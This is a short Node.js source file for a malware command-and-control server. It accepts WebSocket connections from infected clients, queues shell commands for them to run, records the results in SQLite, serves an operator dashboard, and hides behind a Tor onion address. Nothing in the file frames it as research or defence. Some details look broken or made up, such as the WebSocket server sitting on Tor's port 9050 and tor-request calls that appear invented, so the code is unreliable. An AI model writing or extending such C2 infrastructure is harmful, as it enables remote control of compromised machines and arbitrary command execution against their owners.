// core/c2_server.js
const express = require('express');
const Tor = require('tor-request');
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();
const app = express();
const wss = new WebSocket.Server({ port: 9050 });

const db = new sqlite3.Database(':memory:');
db.serialize(() => {
    db.run("CREATE TABLE clients (id TEXT, os TEXT, lastseen TEXT)");
    db.run("CREATE TABLE tasks (id TEXT, command TEXT, result TEXT)");
});

wss.on('connection', (ws) => {
    ws.on('message', (data) => {
        const [clientId, cmd, result] = data.toString().split('|::|');
        
        if (result) {
            db.run("INSERT INTO tasks VALUES (?, ?, ?)", [clientId, cmd, result]);
        } else {
            db.get("SELECT command FROM tasks WHERE id = ? LIMIT 1", [clientId], (err, row) => {
                ws.send(row?.command || 'echo "No pending tasks"');
            });
        }
    });
});

app.use(express.static('dashboard'));
app.listen(80, () => {
    Tor.torCheck((err, status) => {
        if (status) console.log(`C2 Onion: http://${Tor.torAddress}`);
    });
});
